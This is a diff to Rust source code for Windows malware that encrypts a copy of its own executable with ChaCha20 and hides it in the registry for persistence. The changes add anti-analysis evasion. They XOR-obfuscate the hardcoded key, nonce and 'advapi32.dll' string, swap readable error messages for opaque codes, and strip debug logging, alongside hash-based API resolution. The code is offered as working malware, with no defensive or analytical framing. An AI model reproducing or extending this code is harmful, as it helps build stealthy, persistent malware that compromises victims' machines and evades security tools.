@@ -17,15 +17,30 @@ fn x(bytes: &[u8]) -> String {
     String::from_utf8(decoded).unwrap_or_default()
 }
 
-// ChaCha20 Key (32 bytes) - MUST MATCH LOADER
-const CHACHA_KEY: [u8; 32] = [
-    0x50, 0x68, 0x61, 0x6E, 0x74, 0x6F, 0x6D, 0x4D,
-    0x65, 0x73, 0x68, 0x4B, 0x65, 0x79, 0x32, 0x30,
-    0x32, 0x36, 0x5F, 0x53, 0x65, 0x63, 0x72, 0x65,
-    0x74, 0x4B, 0x65, 0x79, 0x21, 0x40, 0x23, 0x24,
+// ChaCha20 Key (32 bytes) - XOR Obfuscated at compile time
+// Actual key is recovered at runtime via XOR with 0xAA
+const CHACHA_KEY_ENC: [u8; 32] = [
+    0xFA, 0xC2, 0xCB, 0xC4, 0xDE, 0xC5, 0xCD, 0xE7,
+    0xCF, 0x83, 0xC2, 0xE1, 0xCF, 0xD4, 0x98, 0x9A,
+    0x98, 0x9C, 0xF5, 0xF9, 0xCF, 0xC9, 0xD9, 0xCF,
+    0xDE, 0xE1, 0xCF, 0xD2, 0x8B, 0xEA, 0x89, 0x8E,
 ];
 
-const CHACHA_NONCE: [u8; 12] = [0x50, 0x48, 0x4D, 0x4E, 0x4F, 0x4E, 0x43, 0x45, 0x30, 0x30, 0x30, 0x31];
+const CHACHA_NONCE_ENC: [u8; 12] = [0xFA, 0xE2, 0xE7, 0xE4, 0xE5, 0xE4, 0xC9, 0xEF, 0x9A, 0x9A, 0x9A, 0x9B];
+const KEY_XOR: u8 = 0xAA;
+
+/// Decode key at runtime
+fn get_key() -> [u8; 32] {
+    let mut k = CHACHA_KEY_ENC;
+    for b in k.iter_mut() { *b ^= KEY_XOR; }
+    k
+}
+
+fn get_nonce() -> [u8; 12] {
+    let mut n = CHACHA_NONCE_ENC;
+    for b in n.iter_mut() { *b ^= KEY_XOR; }
+    n
+}
 
 // Registry API hashes
 const HASH_REG_CREATE_KEY_EX_W: u32 = 0x9CB4594C;
@@ -103,31 +118,31 @@ unsafe fn read_self_native() -> Result<Vec<u8>, String> {
     
     // Resolve APIs
     let get_module_file_name: GetModuleFileNameW = resolve_api(HASH_KERNEL32, djb2(b"GetModuleFileNameW"))
-        .ok_or("GetModuleFileNameW not found")?;
+        .ok_or("E30")?;
     let create_file: CreateFileW = resolve_api(HASH_KERNEL32, HASH_CREATE_FILE_W)
-        .ok_or("CreateFileW not found")?;
+        .ok_or("E31")?;
     let get_file_size: GetFileSize = resolve_api(HASH_KERNEL32, djb2(b"GetFileSize"))
-        .ok_or("GetFileSize not found")?;
+        .ok_or("E32")?;
     let read_file: ReadFile = resolve_api(HASH_KERNEL32, HASH_READ_FILE)
-        .ok_or("ReadFile not found")?;
+        .ok_or("E33")?;
     let close_handle: CloseHandle = resolve_api(HASH_KERNEL32, HASH_CLOSE_HANDLE)
-        .ok_or("CloseHandle not found")?;
+        .ok_or("E34")?;
     
     // Get current executable path
     let mut path_buf = [0u16; 260];
     let len = get_module_file_name(0, path_buf.as_mut_ptr(), 260);
-    if len == 0 { return Err("GetModuleFileNameW failed".to_string()); }
+    if len == 0 { return Err("E35".to_string()); }
     
     // Open file for reading
     // GENERIC_READ=0x80000000, FILE_SHARE_READ=1, OPEN_EXISTING=3
     let handle = create_file(path_buf.as_ptr(), 0x80000000, 1, ptr::null(), 3, 0, 0);
-    if handle == -1 { return Err("CreateFileW failed".to_string()); }
+    if handle == -1 { return Err("E36".to_string()); }
     
     // Get file size
     let size = get_file_size(handle, ptr::null_mut());
     if size == 0xFFFFFFFF { 
         close_handle(handle);
-        return Err("GetFileSize failed".to_string()); 
+        return Err("E37".to_string()); 
     }
     
     // Read file
@@ -136,7 +151,7 @@ unsafe fn read_self_native() -> Result<Vec<u8>, String> {
     let result = read_file(handle, buffer.as_mut_ptr(), size, &mut bytes_read, ptr::null());
     close_handle(handle);
     
-    if result == 0 { return Err("ReadFile failed".to_string()); }
+    if result == 0 { return Err("E38".to_string()); }
     if bytes_read != size { buffer.truncate(bytes_read as usize); }
     
     Ok(buffer)
@@ -147,17 +162,16 @@ unsafe fn read_self_native() -> Result<Vec<u8>, String> {
 pub fn install_self_to_registry() -> Result<String, String> {
     #[cfg(target_os = "windows")]
     unsafe {
-        debug!("Storing encrypted payload (native API)...");
 
         // Read current executable using native API
         let data = read_self_native()?;
         let mut data = data; // Make mutable for encryption
 
-        // Encrypt with ChaCha20
-        let mut cipher = ChaCha20::new(&CHACHA_KEY.into(), &CHACHA_NONCE.into());
+        // Encrypt with ChaCha20 (key decoded at runtime)
+        let key = get_key();
+        let nonce = get_nonce();
+        let mut cipher = ChaCha20::new((&key).into(), (&nonce).into());
         cipher.apply_keystream(&mut data);
-        
-        debug!("Encrypted {} bytes", data.len());
 
         // Base64 encode
         let b64_data = base64_encode(&data);
@@ -179,27 +193,28 @@ pub fn install_self_to_registry() -> Result<String, String> {
             let load_lib: LoadLibraryA = api_resolver::resolve_api(
                 api_resolver::HASH_KERNEL32, 
                 api_resolver::HASH_LOAD_LIBRARY_A
-            ).ok_or("Failed to resolve LoadLibraryA")?;
+            ).ok_or("E10")?;
             
-            // "advapi32.dll" XOR 0x55
-            let dll_name = b"advapi32.dll\0";
+            // Obfuscated "advapi32.dll\0"
+            let dll_enc: [u8; 13] = [0x34, 0x31, 0x23, 0x34, 0x27, 0x3C, 0x66, 0x67, 0x7B, 0x31, 0x3B, 0x3B, 0x55];
+            let dll_name: Vec<u8> = dll_enc.iter().map(|b| b ^ 0x55).collect();
             load_lib(dll_name.as_ptr());
         }
         
         let advapi32 = api_resolver::get_module_by_hash(HASH_ADVAPI32)
-            .ok_or("Failed to get advapi32")?;
+            .ok_or("E11")?;
 
         let reg_create: RegCreateKeyExW = api_resolver::get_export_by_hash(advapi32, HASH_REG_CREATE_KEY_EX_W)
             .map(|p| std::mem::transmute(p))
-            .ok_or("Failed to resolve RegCreateKeyExW")?;
+            .ok_or("E12")?;
             
         let reg_set: RegSetValueExW = api_resolver::get_export_by_hash(advapi32, HASH_REG_SET_VALUE_EX_W)
             .map(|p| std::mem::transmute(p))
-            .ok_or("Failed to resolve RegSetValueExW")?;
+            .ok_or("E13")?;
             
         let reg_close: RegCloseKey = api_resolver::get_export_by_hash(advapi32, HASH_REG_CLOSE_KEY)
             .map(|p| std::mem::transmute(p))
-            .ok_or("Failed to resolve RegCloseKey")?;
+            .ok_or("E14")?;
 
         // Create registry key
         let mut hkey: isize = 0;
@@ -218,7 +233,7 @@ pub fn install_self_to_registry() -> Result<String, String> {
         );
         
         if status != 0 {
-            return Err(format!("RegCreateKeyExW failed: {}", status));
+            return Err(format!("E39:{}", status));
         }
 
         // Set value (Payload)
@@ -240,10 +255,10 @@ pub fn install_self_to_registry() -> Result<String, String> {
         reg_close(hkey);
         
         if status != 0 {
-            return Err(format!("RegSetValueExW failed: {}", status));
+            return Err(format!("E40:{}", status));
         }
 
-        debug!("Encrypted blob stored (native API)");
+
         
         Ok(path)
     }
